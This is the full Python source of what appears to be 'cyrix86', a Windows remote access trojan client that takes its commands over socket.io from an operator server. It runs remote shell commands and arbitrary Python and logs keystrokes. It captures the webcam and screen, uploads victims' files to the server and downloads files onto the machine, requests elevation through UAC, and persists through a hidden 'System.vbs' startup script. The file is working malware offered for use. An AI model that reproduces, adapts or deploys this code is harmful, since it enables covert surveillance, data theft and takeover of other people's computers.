"""
Author: Madhanmaaz
Github: https://github.com/madhanmaaz/cyrix86-module
Website: https://madhanmaaz.netlify.app
Description: cyrix86 client app using socket.io
"""

import subprocess
import mss.tools
import winsound
import keyboard
import socketio
import requests
import string
import base64
import random
import ctypes
import time
import json
import mss
import sys
import os

ORIGIN, options = base64.b64decode(sys.argv[1]).decode().split("@@")

options = options.split("-")
STARTUP = options[1] == "1"
UAC = options[2] == "1"
ID = f"{os.environ['USERDOMAIN']}-{os.environ['USERNAME']}"

if ctypes.windll.shell32.IsUserAnAdmin():
    ID = ID + '-UAC'

USERAGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
BASE_FOLDER_NAME = os.path.dirname(sys.executable).split("\\")[-1]
TEMP = os.environ.get("TEMP", os.environ.get("APPDATA", "UNKNOWN"))
SIO = socketio.Client()

def randomString(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def getFileName(ext):
    timeStamp = time.strftime("%Y-%m-%d-%H-%M-%S")
    return os.path.join(TEMP, f"{timeStamp}-{randomString(5)}.{ext}")

def _exit():
    SIO.disconnect()
    os._exit(0)

def toServer(data):
    if not SIO.connected: return
    SIO.emit("to-server", data)

def pipInstall(t, args):
    Python({
        "type": t,
        "app": "pip",
        "args": args
    })

def postFile(t, filePath):
    requests.post(f"{ORIGIN}/client", files={"file": open(filePath, "rb")}, data={"id": ID,"type": t})

class Terminal:
    def __init__(self, options):
        self.type = options.get("type")
        self.app = options.get("app")
        self.value = options.get("value")
        
        if self.value[0:3] == "cd ":
            self.chdir()
        else:
            self.run()
    
    def chdir(self):
        os.chdir(self.value[3:])
        toServer({
            "type": self.type,
            "output": f"Current Directory: {os.getcwd()}",
            "cwd": os.getcwd()
        })
    
    def run(self):
        if self.app != "cmd": 
            self.value = f"{self.app} {self.value}"

        result = subprocess.run(
            self.value, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )

        toServer({
            "type": self.type,
            "output": result.stdout if result.returncode == 0 else result.stderr
        })
    
class Webcam:
    def __init__(self, options):
        self.type = options.get("type")
        self.deviceIndex = int(options.get("deviceIndex"))

        self.snapshot()
    
    def snapshot(self):
        try:
            import cv2
        except ImportError:
            toServer({
                "type": self.type,
                "output": "Please wait, installing dependencies..."
            })

            return pipInstall(self.type, "install opencv-python")
        
        device = cv2.VideoCapture(self.deviceIndex, cv2.CAP_DSHOW)
        if not device.isOpened():
            return toServer({
                "type": self.type,
                "output": "Failed to open. webcam not found?"
            })
        
        time.sleep(0.5)
        ret, frame = device.read()
        device.release()
        if not ret:
            return toServer({
                "type": self.type,
                "output": "Failed to capture frame"
            })
        
        filename = getFileName("jpg")
        cv2.imwrite(filename, frame)
        postFile(self.type, filename)
        os.remove(filename)

DISPLAY_IS_RECORDING = False
class Display:
    def __init__(self, options):
        self.type = options.get("type")
        self.action = options.get("action")
        self.deviceIndex = int(options.get("deviceIndex"))
        self.duration = int(options.get("duration"))

        if self.action == "snapshot":
            self.snapshot()
        elif self.action == "record":
            if  DISPLAY_IS_RECORDING == False:
                self.record()
            else:
                toServer({
                    "type": self.type,
                    "output": "Display is already recording"
                })
    
    def snapshot(self):
        filename = getFileName("jpg")
        with mss.mss() as sct:
            monitor = sct.grab(sct.monitors[self.deviceIndex])
            mss.tools.to_png(monitor.rgb, monitor.size, output=filename)
            postFile(self.type, filename)
            os.remove(filename)
    
    def record(self):
        try:
            import av
            import numpy as np
        except ImportError:
            toServer({
                "type": self.type,
                "output": "Please wait, installing dependencies..."
            })

            return pipInstall(self.type, "install av numpy")
        
        global DISPLAY_IS_RECORDING
        DISPLAY_IS_RECORDING = True
        filename = getFileName("mp4")
        sct = mss.mss()
        monitor = sct.monitors[self.deviceIndex]
        width = monitor.get("width")
        height = monitor.get("height")
        output = av.open(filename, mode='w')
        stream = output.add_stream('libx264', rate=15)
        stream.width = width
        stream.height = height
        stream.pix_fmt = 'yuv420p'
        stream.options = {
            'crf': '35',
            'preset': 'ultrafast',
            'tune': 'zerolatency'
        }

        FPS = 15
        for _ in range((self.duration + 2) * FPS):
            img = np.array(sct.grab(monitor))
            frame = av.VideoFrame.from_ndarray(img, format='bgra')
            frame = frame.reformat(format='yuv420p', width=width, height=height)
            for packet in stream.encode(frame):
                output.mux(packet)
            time.sleep(1 / FPS)

        for packet in stream.encode():
            output.mux(packet)
        
        output.close()
        DISPLAY_IS_RECORDING = False
        postFile(self.type, filename)
        os.remove(filename)

class Sound:
    def __init__(self, options):
        self.type = options.get("type")
        self.filePath = options.get("filePath")

        self.play()
    
    def play(self):
        if not os.path.exists(self.filePath):
            return toServer({
                "type": self.type,
                "output": f"ERROR: File not found: {self.filePath}"
            })
        
        winsound.PlaySound(self.filePath, winsound.SND_FILENAME | winsound.SND_ASYNC)
        toServer({
            "type": self.type,
            "output": f"Playing: {self.filePath}"
        })

class Notifications:
    def __init__(self, options):
        self.type = options.get("type")
        self.action = options.get("action")
        self.title = options.get("title")
        self.message = options.get("message")
        self.icon = int(options.get("icon"))
        self.buttons = int(options.get("buttons"))

        if self.action == "messagebox":
            self.messagebox()
        
    def messagebox(self):
        toServer({
            "type": self.type,
            "output": f"Messagebox opened successfully"
        })
        ctypes.windll.user32.MessageBoxW(0, self.title, self.message, self.buttons | self.icon)

KEYBOARD_STATE = False
class Keyboard:
    def __init__(self, options):
        global KEYBOARD_STATE
        self.type = options.get("type")
        self.action = options.get("action")

        output = f"KEYBOARD_STATE: {KEYBOARD_STATE}"
        if self.action == "start" and KEYBOARD_STATE == False:
            KEYBOARD_STATE = True
            keyboard.hook(self.callback)
            output = "Keyboard started"
            
        elif self.action == "stop" and KEYBOARD_STATE:
            KEYBOARD_STATE = False
            keyboard.unhook_all()
            output = "Keyboard stopped"

        toServer({
            "type": self.type,
            "output": output
        })
    
    def callback(self, event):
        if event.event_type == keyboard.KEY_DOWN:
            toServer({
                "type": self.type,
                "output": event.name
            })

class FileManager:
    def __init__(self, options):
        self.type = options.get("type")
        self.action = options.get("action")
        self.value = options.get("value")

        if self.action == "goto":
            self.goto()
        elif self.action == "upload":
            self.upload()
        elif self.action == "download":
            self.download()
    
    def goto(self):
        if not os.path.exists(self.value):
            return toServer({
                "type": self.type,
                "output": f"ERROR: Directory not found"
            })
        
        os.chdir(self.value)
        cwd = os.getcwd()
        toServer({
            "type": self.type,
            "output": self.listDir(cwd),
            "cwd": cwd
        })
    
    def upload(self):
        filename = self.value.split("@")[0]
        url = ''.join(self.value.split("@")[1:])
        response = requests.get(url, headers={
            "User-Agent": USERAGENT
        })

        if response.status_code == 200:
            with open(filename, "wb") as f:
                f.write(response.content)
            toServer({
                "type": self.type,
                "output": f"File uploaded successfully"
            })
        else:
            toServer({
                "type": self.type,
                "output": f"ERROR: Failed to upload file"
            })
    
    def download(self):
        fullPath = os.path.join(os.getcwd(), self.value)
        if not os.path.exists(fullPath):
            return toServer({
                "type": self.type,
                "output": f"ERROR: File or directory not found"
            })
        
        if os.path.isdir(fullPath):
            os.chdir(fullPath)
            toServer({
                "type": self.type,
                "output": self.listDir(fullPath),
                "cwd": os.getcwd()
            })
        else:
            postFile(self.type, fullPath)
    
    def listDir(self, path): 
        files = []
        folders = []
        try:
            for fileName in os.listdir(path):
                fullPath = os.path.join(path, fileName)
                if os.path.isfile(fullPath): 
                    files.append(fileName)
                elif os.path.isdir(fullPath): 
                    folders.append(fileName)
        except: pass
        return json.dumps({
            "files": files,
            "folders": folders
        })

class Python:
    def __init__(self, options):
        self.type = options.get("type")
        self.app = options.get("app")
        self.args = options.get("args")
        self.code = options.get("code", "")

        if self.app == "python":
            self.run()
        elif self.app == "pip":
            self.pip()
    
    def run(self):
        filename = getFileName("py")
        with open(filename, "w") as f:
            f.write(self.code)
        result = subprocess.run(f'"{sys.executable}" "{filename}"', shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        toServer({
            "type": self.type,
            "output": result.stdout if result.returncode == 0 else result.stderr
        })
        os.remove(filename)
        
    def pip(self):
        if not self.args: return
        pipPath = os.path.join(os.path.dirname(sys.executable), "Scripts", "pip.exe")
        toServer({
            "type": self.type,
            "output": f"Running pip {self.args}"
        })

        result = subprocess.run(f'"{pipPath}" {self.args}', shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        toServer({
            "type": self.type,
            "output": result.stdout if result.returncode == 0 else result.stderr
        })

class Others:
    def __init__(self, options):
        self.type = options.get("type")
        self.action = options.get("action")

        if self.action == "uac":
            self.uac()
        elif self.action == "startup":
            self.startup()
        elif self.action == "exit":
            self.exit()
    
    def uac(self):
        if not ctypes.windll.shell32.IsUserAnAdmin():
            res = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, f'"{sys.argv[0]}" {sys.argv[1]}', None, 0)
            toServer({
                "type": self.type,
                "output": f"UAC request is accepted. New ID: {ID}-UAC" if res == 42 else "UAC request is denied"
            })
            if res == 42: _exit()
                
    def startup(self):
        startupFile = os.path.join(os.environ["APPDATA"],"Microsoft","Windows","Start Menu","Programs","Startup","System.vbs")
        with open(startupFile, "w",) as f:
            f.write(f'''' python installer
CreateObject("WScript.Shell").run "cmd /c ""cd %APPDATA%\\{BASE_FOLDER_NAME} & python -m cyrix86 {sys.argv[1]}""", 0''')
        toServer({
            "type": self.type,
            "output": f"Startup file created successfully" if os.path.exists(startupFile) else f"Startup file creation failed"
        })

    def exit(self):
        _exit()

HANDLER_MAP = {
    "terminal": Terminal,
    "webcam": Webcam,
    "display": Display,
    "sound": Sound,
    "notifications": Notifications,
    "keyboard": Keyboard,
    "filemanager": FileManager,
    "python": Python,
    "others": Others,
}

@SIO.on("connect")
def onConnect():
    a = os.path.join(os.environ.get("APPDATA"), "hasPython")
    if not os.path.exists(a):
        os.mkdir(a)
    SIO.emit("to-server", {
        "type": "terminal",
        "output": f"Current Directory: {os.getcwd()}",
        "cwd": os.getcwd()
    })

@SIO.on("disconnect")
def onDisconnect():
    pass

@SIO.on("receiver")
def onReceiver(data):
    try: HANDLER_MAP.get(data.get("type"))(data)
    except Exception as e: 
        toServer({
            "type": data.get("type"),
            "output": f"ERROR: {e}"
        })

def main():
    if STARTUP: Others({"type": "others", "action": "startup"})
    if UAC: Others({"type": "others", "action": "uac"})

    while True:
        try:
            SIO.connect(ORIGIN, wait_timeout=10, auth={
                "id": ID,
                "clientType": "python"
            })
            SIO.wait()
        except:
            time.sleep(4)

if __name__ == "__main__":
    main()